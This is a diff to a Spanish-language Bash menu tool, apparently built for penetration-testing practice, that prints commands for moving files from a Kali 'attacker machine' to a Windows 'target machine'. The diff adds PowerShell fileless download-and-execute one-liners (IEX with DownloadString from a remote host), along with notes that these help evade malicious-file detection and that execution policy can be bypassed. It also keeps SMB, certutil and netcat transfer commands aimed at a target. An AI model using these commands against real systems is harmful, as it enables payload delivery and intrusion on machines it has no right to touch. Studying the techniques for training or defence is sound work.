@@ -35,36 +35,85 @@ get_target_ip() {
             fi
         fi
         echo -e "${RED}IP inválida. Por favor, ingrese una IP válida.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- 192.168.1.100"
+        echo "- 10.0.0.1"
+        echo "- 172.16.0.1"
     done
 }
 
 # Función para solicitar y validar dominio
 get_target_domain() {
     while true; do
-        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com): "
+        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com o sub.ejemplo.com): "
         read -r TARGET_DOMAIN
-        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$ ]]; then
+        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9])*\.[a-zA-Z]{2,}$ ]]; then
             break
         fi
         echo -e "${RED}Dominio inválido. Por favor, ingrese un dominio válido.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- ejemplo.com"
+        echo "- sub.ejemplo.com"
+        echo "- dominio.org"
+        echo "- sub1.sub2.ejemplo.com"
     done
 }
 
 # Función para solicitar credenciales
 get_credentials() {
-    echo -n "Ingrese el nombre de usuario: "
-    read -r USERNAME
-    echo -n "Ingrese la contraseña: "
-    read -rs PASSWORD
-    echo
+    while true; do
+        echo -n "Ingrese el nombre de usuario: "
+        read -r USERNAME
+        if [[ $USERNAME =~ ^[a-zA-Z0-9_\-\.]+$ ]]; then
+            break
+        fi
+        echo -e "${RED}Nombre de usuario inválido. Por favor, use solo letras, números, guiones y puntos.${NC}"
+    done
+
+    while true; do
+        echo -n "Ingrese la contraseña: "
+        read -rs PASSWORD
+        echo
+        if [ -n "$PASSWORD" ]; then
+            break
+        fi
+        echo -e "${RED}La contraseña no puede estar vacía.${NC}"
+    done
 }
 
 # Función para solicitar archivos
 get_files() {
-    echo -n "Ingrese la ruta del archivo local: "
-    read -r LOCAL_FILE
-    echo -n "Ingrese la ruta del archivo remoto: "
-    read -r REMOTE_FILE
+    while true; do
+        echo -n "Ingrese la ruta del archivo local: "
+        read -r LOCAL_FILE
+        if [ -f "$LOCAL_FILE" ]; then
+            break
+        fi
+        echo -e "${RED}Archivo no encontrado. Por favor, ingrese una ruta válida.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- /ruta/al/archivo.txt"
+        echo "- C:\\Windows\\Temp\\archivo.exe"
+        echo "- ./archivo.sh"
+    done
+
+    while true; do
+        echo -n "Ingrese la ruta del archivo remoto: "
+        read -r REMOTE_FILE
+        # Validación más flexible para rutas
+        if [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\:]+$ ]] || \
+           [[ $REMOTE_FILE =~ ^[a-zA-Z]:[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
+           [[ $REMOTE_FILE =~ ^[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
+           [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\]+$ ]]; then
+            break
+        fi
+        echo -e "${RED}Ruta inválida. Por favor, ingrese una ruta válida.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- /tmp/archivo.txt"
+        echo "- C:\\Windows\\Temp\\archivo.exe"
+        echo "- ./archivo.sh"
+        echo "- /home/kali/archivo.sh"
+        echo "- archivo.txt"
+    done
 }
 
 # Función para solicitar puerto
@@ -76,18 +125,32 @@ get_port() {
             break
         fi
         echo -e "${RED}Puerto inválido. Por favor, ingrese un puerto válido.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- 80 (HTTP)"
+        echo "- 443 (HTTPS)"
+        echo "- 445 (SMB)"
+        echo "- 22 (SSH)"
+        echo "- 21 (FTP)"
     done
 }
 
 # Función para solicitar URL
 get_url() {
     while true; do
-        echo -n "Ingrese la URL (ej: http://ejemplo.com): "
+        echo -n "Ingrese la URL (ej: http://ejemplo.com o http://192.168.1.100): "
         read -r TARGET_URL
-        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}(/.*)?$ ]]; then
+        # Validación más flexible que acepta IPs y dominios
+        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z]{2,})?(\.[a-zA-Z]{2,})?(:[0-9]+)?(/.*)?$ ]] || \
+           [[ $TARGET_URL =~ ^https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]+)?(/.*)?$ ]]; then
             break
         fi
         echo -e "${RED}URL inválida. Por favor, ingrese una URL válida.${NC}"
+        echo -e "${YELLOW}Ejemplos válidos:${NC}"
+        echo "- http://ejemplo.com"
+        echo "- http://192.168.1.100"
+        echo "- http://ejemplo.com:8080"
+        echo "- http://192.168.1.100:8000"
+        echo "- http://sub.ejemplo.com"
     done
 }
 
@@ -171,224 +234,14 @@ show_windows_to_kali_menu() {
 # Función para implementar Kali → Windows con SMB
 implement_kali_to_windows_smb() {
     echo -e "${BLUE}=== Transferencia Kali → Windows usando SMB ===${NC}"
-    echo -e "${YELLOW}Seleccione el método de transferencia:${NC}"
-    echo -e "${GREEN}1.${NC} Servidor SMB básico (acceso de invitado)"
-    echo -e "${GREEN}2.${NC} Servidor SMB con usuario y contraseña"
-    echo -e "${GREEN}3.${NC} Servidor SMB con múltiples usuarios"
-    echo -e "${GREEN}4.${NC} Servidor SMB con permisos específicos"
-    echo -e "${GREEN}5.${NC} Servidor SMB con logging"
-    echo -e "${GREEN}6.${NC} Servidor SMB con Samba"
-    echo -e "${GREEN}7.${NC} Volver al menú anterior"
+    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
+    echo "1. Crear un servidor SMB básico:"
+    echo "sudo impacket-smbserver share /tmp/smbshare -smb2support"
     echo
-    read -p "Seleccione una opción: " smb_option
-
-    case $smb_option in
-        1)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Crear un servidor SMB básico:"
-            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:guest"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        2)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Crear un servidor SMB con autenticación:"
-            read -p "Ingrese el nombre de usuario para el share: " smb_user
-            read -s -p "Ingrese la contraseña para el share: " smb_pass
-            echo
-            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        3)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Crear un servidor SMB con múltiples usuarios:"
-            read -p "Ingrese el nombre del primer usuario: " smb_user1
-            read -s -p "Ingrese la contraseña del primer usuario: " smb_pass1
-            echo
-            read -p "Ingrese el nombre del segundo usuario: " smb_user2
-            read -s -p "Ingrese la contraseña del segundo usuario: " smb_pass2
-            echo
-            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user1 -password $smb_pass1 -user $smb_user2 -password $smb_pass2"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:$smb_user1 $smb_pass1"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        4)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Crear un servidor SMB con permisos específicos:"
-            read -p "Ingrese el nombre de usuario: " smb_user
-            read -s -p "Ingrese la contraseña: " smb_pass
-            echo
-            read -p "Ingrese los permisos (ej: 777): " smb_perm
-            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass -perm $smb_perm"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        5)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Crear un servidor SMB con logging:"
-            read -p "Ingrese el nombre de usuario: " smb_user
-            read -s -p "Ingrese la contraseña: " smb_pass
-            echo
-            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass -debug"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        6)
-            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
-            echo "1. Configurar servidor SMB con Samba:"
-            echo "sudo apt-get install samba"
-            echo "sudo nano /etc/samba/smb.conf"
-            echo "[share]"
-            echo "   path = /tmp/smbshare"
-            echo "   browseable = yes"
-            echo "   read only = no"
-            echo "   guest ok = yes"
-            echo "sudo service smbd restart"
-            echo
-            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
-            echo "1. Conectarse al share y copiar el archivo:"
-            echo "net use \\\\<IP_KALI>\\share /user:guest"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        7)
-            return
-            ;;
-        *)
-            echo -e "${RED}Opción inválida${NC}"
-            return
-            ;;
-    esac
-
-    echo
-    echo -e "${YELLOW}Seleccione el método de transferencia en Windows:${NC}"
-    echo -e "${GREEN}1.${NC} Usando net use (CMD)"
-    echo -e "${GREEN}2.${NC} Usando PowerShell"
-    echo -e "${GREEN}3.${NC} Usando New-PSDrive"
-    echo -e "${GREEN}4.${NC} Usando robocopy"
-    echo -e "${GREEN}5.${NC} Usando xcopy"
-    echo -e "${GREEN}6.${NC} Usando PowerShell con credenciales explícitas"
-    echo -e "${GREEN}7.${NC} Usando PowerShell con autenticación de dominio"
-    echo
-    read -p "Seleccione una opción: " win_option
-
-    case $win_option in
-        1)
-            echo -e "${YELLOW}Usando net use (CMD):${NC}"
-            echo "net use \\\\<IP_KALI>\\share /user:guest"
-            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-            ;;
-        2)
-            echo -e "${YELLOW}Usando PowerShell:${NC}"
-            echo "Copy-Item -Path '\\\\<IP_KALI>\\share\\archivo.exe' -Destination 'C:\\Windows\\Temp\\archivo.exe'"
-            ;;
-        3)
-            echo -e "${YELLOW}Usando New-PSDrive:${NC}"
-            read -p "Ingrese el nombre de usuario: " ps_user
-            read -s -p "Ingrese la contraseña: " ps_pass
-            echo
-            echo '$password = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
-            echo '$cred = New-Object System.Management.Automation.PSCredential("'$ps_user'", $password)'
-            echo 'New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\\\<IP_KALI>\\share" -Credential $cred'
-            echo 'Copy-Item -Path "S:\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe"'
-            ;;
-        4)
-            echo -e "${YELLOW}Usando robocopy:${NC}"
-            echo "robocopy \\\\<IP_KALI>\\share C:\\Windows\\Temp archivo.exe"
-            ;;
-        5)
-            echo -e "${YELLOW}Usando xcopy:${NC}"
-            echo "xcopy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe /Y"
-            ;;
-        6)
-            echo -e "${YELLOW}Usando PowerShell con credenciales explícitas:${NC}"
-            read -p "Ingrese el nombre de usuario: " ps_user
-            read -s -p "Ingrese la contraseña: " ps_pass
-            echo
-            echo '$secpasswd = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
-            echo '$mycreds = New-Object System.Management.Automation.PSCredential("'$ps_user'", $secpasswd)'
-            echo 'Copy-Item -Path "\\\\<IP_KALI>\\share\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe" -Credential $mycreds'
-            ;;
-        7)
-            echo -e "${YELLOW}Usando PowerShell con autenticación de dominio:${NC}"
-            read -p "Ingrese el nombre del dominio: " ps_domain
-            read -p "Ingrese el nombre de usuario: " ps_user
-            read -s -p "Ingrese la contraseña: " ps_pass
-            echo
-            echo '$domain = "'$ps_domain'"'
-            echo '$username = "'$ps_user'"'
-            echo '$password = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
-            echo '$cred = New-Object System.Management.Automation.PSCredential("$domain\\$username", $password)'
-            echo 'Copy-Item -Path "\\\\<IP_KALI>\\share\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe" -Credential $cred'
-            ;;
-        *)
-            echo -e "${RED}Opción inválida${NC}"
-            return
-            ;;
-    esac
-
-    echo
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Las nuevas versiones de Windows pueden bloquear el acceso de invitados"
-    echo "2. Si el acceso de invitados está bloqueado, usar credenciales"
-    echo "3. Para evitar problemas de autenticación:"
-    echo "   - Usar credenciales válidas de Windows"
-    echo "   - Verificar que el usuario tenga permisos de lectura"
-    echo "   - Considerar usar un usuario con privilegios de administrador"
-    echo "4. Para problemas de conectividad:"
-    echo "   - Verificar que el puerto 445 esté abierto"
-    echo "   - Comprobar que el firewall no esté bloqueando SMB"
-    echo "   - Asegurarse de que el servicio SMB esté habilitado en Windows"
-    echo "5. Para mejorar la seguridad:"
-    echo "   - Usar contraseñas fuertes"
-    echo "   - Limitar los permisos al mínimo necesario"
-    echo "   - Considerar usar SMB con cifrado (SMB 3.0)"
-    echo
-    echo -e "${YELLOW}Soluciones a problemas comunes:${NC}"
-    echo "1. Error de acceso denegado:"
-    echo "   - Verificar credenciales"
-    echo "   - Comprobar permisos de la carpeta compartida"
-    echo "   - Intentar con otro usuario"
-    echo "2. Error de red:"
-    echo "   - Verificar conectividad entre máquinas"
-    echo "   - Comprobar configuración de red"
-    echo "   - Verificar que los servicios SMB estén activos"
-    echo "3. Error de autenticación:"
-    echo "   - Usar credenciales de dominio si es necesario"
-    echo "   - Verificar políticas de seguridad de Windows"
-    echo "   - Comprobar restricciones de red"
-    echo
-    echo -e "${YELLOW}Métodos alternativos si SMB está bloqueado:${NC}"
-    echo "1. Usar WebDAV:"
-    echo "   - Configurar servidor WebDAV en Kali"
-    echo "   - Conectar desde Windows usando 'net use' con puerto 80"
-    echo
-    echo "2. Usar FTP:"
-    echo "   - Configurar servidor FTP en Kali"
-    echo "   - Usar cliente FTP nativo de Windows"
-    echo
-    echo "3. Usar HTTP/HTTPS:"
-    echo "   - Servidor web en Kali"
-    echo "   - PowerShell o certutil en Windows"
-    echo
-    echo "4. Usar SSH:"
-    echo "   - Servidor SSH en Kali"
-    echo "   - pscp o scp en Windows"
+    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
+    echo "1. Conectarse al share y copiar el archivo:"
+    echo "net use \\\\<IP_KALI>\\share /user:guest"
+    echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
 }
 
 # Función para implementar Kali → Windows con Python + PowerShell
@@ -401,12 +254,6 @@ implement_kali_to_windows_python_powershell() {
     echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
     echo "1. Usar PowerShell para descargar el archivo:"
     echo "(New-Object Net.WebClient).DownloadFile('http://<IP_KALI>:8000/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
-    echo
-    echo -e "${YELLOW}Alternativa con Invoke-WebRequest:${NC}"
-    echo "Invoke-WebRequest -Uri 'http://<IP_KALI>:8000/archivo.exe' -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
-    echo
-    echo -e "${YELLOW}Alternativa con certutil:${NC}"
-    echo "certutil.exe -urlcache -split -f http://<IP_KALI>:8000/archivo.exe C:\\Windows\\Temp\\archivo.exe"
 }
 
 # Función para implementar Windows → Windows con SMB
@@ -421,9 +268,6 @@ implement_windows_to_windows_smb() {
     echo "net use \\\\<IP_WINDOWS>\\sharename /user:username password"
     echo "2. Copiar archivo:"
     echo "copy \\\\<IP_WINDOWS>\\sharename\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
-    echo
-    echo -e "${YELLOW}Alternativa con PowerShell:${NC}"
-    echo "Copy-Item -Path '\\\\<IP_WINDOWS>\\sharename\\archivo.exe' -Destination 'C:\\Windows\\Temp\\archivo.exe'"
 }
 
 # Función para implementar Kali → Kali con Netcat
@@ -436,10 +280,6 @@ implement_kali_to_kali_netcat() {
     echo -e "${YELLOW}PASO 2: En Kali origen (emisor)${NC}"
     echo "1. Enviar el archivo:"
     echo "nc <IP_KALI_DESTINO> 1234 < archivo.sh"
-    echo
-    echo -e "${YELLOW}Alternativa con transferencia encriptada (cryptcat):${NC}"
-    echo "En destino: cryptcat -l -p 1234 > archivo.sh"
-    echo "En origen: cryptcat <IP_KALI_DESTINO> 1234 < archivo.sh"
 }
 
 # Función para implementar Windows → Kali con PowerShell
@@ -457,10 +297,6 @@ implement_windows_to_kali_powershell() {
     echo '    file = Get-Item -Path $filePath'
     echo '}'
     echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
-    echo
-    echo -e "${YELLOW}Alternativa con WebClient:${NC}"
-    echo '$wc = New-Object System.Net.WebClient'
-    echo '$wc.UploadFile("http://<IP_KALI>:8000/upload", "C:\\Windows\\Temp\\archivo.exe")'
 }
 
 # Función para PowerShell Web Downloads
@@ -468,9 +304,6 @@ implement_powershell_web_downloads() {
     echo -e "${BLUE}=== PowerShell Web Downloads ===${NC}"
     echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina objetivo${NC}"
     echo -e "${YELLOW}Descripción: Descarga archivos desde un servidor web hacia la máquina objetivo${NC}"
-    
-    get_url
-    get_files
     
     echo -e "${YELLOW}Métodos disponibles:${NC}"
     echo "1. DownloadFile"
@@ -480,37 +313,32 @@ implement_powershell_web_downloads() {
     echo
 
     echo -e "${GREEN}1. DownloadFile Method:${NC}"
-    echo "(New-Object Net.WebClient).DownloadFile('$TARGET_URL', '$REMOTE_FILE')"
+    echo "(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
     echo
 
     echo -e "${GREEN}2. DownloadFileAsync Method:${NC}"
-    echo "(New-Object Net.WebClient).DownloadFileAsync('$TARGET_URL', '$REMOTE_FILE')"
+    echo "(New-Object Net.WebClient).DownloadFileAsync('http://192.168.1.100/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
     echo
 
     echo -e "${GREEN}3. Invoke-WebRequest Method:${NC}"
-    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE'"
+    echo "Invoke-WebRequest -Uri 'http://192.168.1.100/archivo.exe' -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
     echo
 
     echo -e "${GREEN}4. Invoke-WebRequest con User Agent:${NC}"
-    echo "Invoke-WebRequest -Uri '$TARGET_URL' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile '$REMOTE_FILE'"
+    echo "Invoke-WebRequest -Uri 'http://192.168.1.100/archivo.exe' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
     echo
 
     echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Para evitar errores de SSL/TLS:"
-    echo "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}"
-    echo
-    echo "2. Para evitar errores de IE:"
-    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE' -UseBasicParsing"
-    echo
-    echo "3. Para simular tráfico legítimo:"
-    echo '$wc = New-Object System.Net.WebClient'
-    echo '$wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
-    echo '$wc.DownloadFile("$TARGET_URL", "$REMOTE_FILE")'
+    echo "1. Reemplace '192.168.1.100' con la IP de su servidor"
+    echo "2. Ajuste la ruta de destino según sus necesidades"
+    echo "3. El método DownloadFileAsync es útil para archivos grandes"
+    echo "4. El User Agent personalizado puede ayudar a evadir detección"
 }
 
 # Función para PowerShell Fileless Downloads
 implement_powershell_fileless() {
     echo -e "${BLUE}=== PowerShell Fileless Downloads ===${NC}"
+    echo -e "${YELLOW}IMPORTANTE: Este método ejecuta scripts directamente en memoria sin escribir en disco${NC}"
     
     echo -e "${YELLOW}Métodos disponibles:${NC}"
     echo "1. IEX (Invoke-Expression)"
@@ -518,18 +346,55 @@ implement_powershell_fileless() {
     echo
 
     echo -e "${GREEN}1. IEX Method:${NC}"
-    echo "IEX (New-Object Net.WebClient).DownloadString('$TARGET_URL')"
-    echo "Ejemplo: IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')"
+    echo "Este método descarga y ejecuta un script directamente en memoria:"
+    echo
+    echo "Ejemplo 1 - Script simple:"
+    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')"
+    echo
+    echo "Ejemplo 2 - Script con parámetros:"
+    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') -Parametro1 'valor1' -Parametro2 'valor2'"
+    echo
+    echo "Ejemplo 3 - Script con credenciales:"
+    echo "\$creds = Get-Credential"
+    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') -Credential \$creds"
     echo
 
     echo -e "${GREEN}2. IEX with Pipeline:${NC}"
-    echo "(New-Object Net.WebClient).DownloadString('$TARGET_URL') | IEX"
+    echo "Este método es similar pero usa el operador pipe para la ejecución:"
+    echo
+    echo "Ejemplo 1 - Script simple:"
+    echo "(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX"
+    echo
+    echo "Ejemplo 2 - Script con salida a variable:"
+    echo "\$resultado = (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX"
+    echo
+    echo "Ejemplo 3 - Script con filtrado:"
+    echo "(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX | Where-Object { \$_ -match 'patrón' }"
     echo
 
     echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. El script se ejecuta directamente en memoria"
-    echo "2. No se escribe nada en disco"
-    echo "3. Útil para evadir detección de archivos"
+    echo "1. El script se ejecuta directamente en memoria, no se escribe en disco"
+    echo "2. Útil para evadir detección de archivos maliciosos"
+    echo "3. Requiere que el script sea accesible vía HTTP/HTTPS"
+    echo "4. El script debe estar en formato PowerShell (.ps1)"
+    echo "5. Se recomienda usar HTTPS para mayor seguridad"
+    echo
+    echo -e "${YELLOW}Consideraciones de seguridad:${NC}"
+    echo "1. Verificar la fuente del script antes de ejecutarlo"
+    echo "2. Usar HTTPS para evitar interceptación del tráfico"
+    echo "3. Considerar firmar el script con un certificado digital"
+    echo "4. Implementar políticas de ejecución de scripts apropiadas"
+    echo
+    echo -e "${YELLOW}Soluciones a problemas comunes:${NC}"
+    echo "1. Error de ejecución de scripts:"
+    echo "   - Verificar la política de ejecución: Get-ExecutionPolicy"
+    echo "   - Ajustar la política si es necesario: Set-ExecutionPolicy Bypass -Scope Process"
+    echo "2. Error de conexión:"
+    echo "   - Verificar que la URL sea accesible"
+    echo "   - Comprobar la conectividad de red"
+    echo "3. Error de contenido:"
+    echo "   - Verificar que el script sea válido"
+    echo "   - Comprobar la codificación del archivo"
 }
 
 # Función para SMB Transfers
@@ -564,14 +429,6 @@ implement_smb_transfers() {
     echo
     echo -e "${GREEN}3. Usando PowerShell:${NC}"
     echo "Copy-Item -Path '\\\\$TARGET_IP\\share\\$LOCAL_FILE' -Destination '$REMOTE_FILE'"
-    echo
-
-    echo -e "${YELLOW}Notas importantes:${NC}"
-    echo "1. Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados"
-    echo "2. Si recibe un error al usar 'copy filename \\IP\\sharename', intente montar primero"
-    echo "3. Requiere permisos de administrador en Windows"
-    echo "4. Puede ser bloqueado por políticas de seguridad"
-    echo "5. Útil para transferencias internas"
 }
 
 # Función para Métodos Alternativos
@@ -1007,7 +864,8 @@ while true; do
                     4) implement_alternative_methods ;;
                     5) implement_base64 ;;
                     6) implement_windows_to_windows_fileless ;;
-                    7) break ;;
+                    7) implement_powershell_fileless ;;
+                    8) break ;;
                     *) echo -e "${RED}Opción inválida${NC}" ;;
                 esac
 
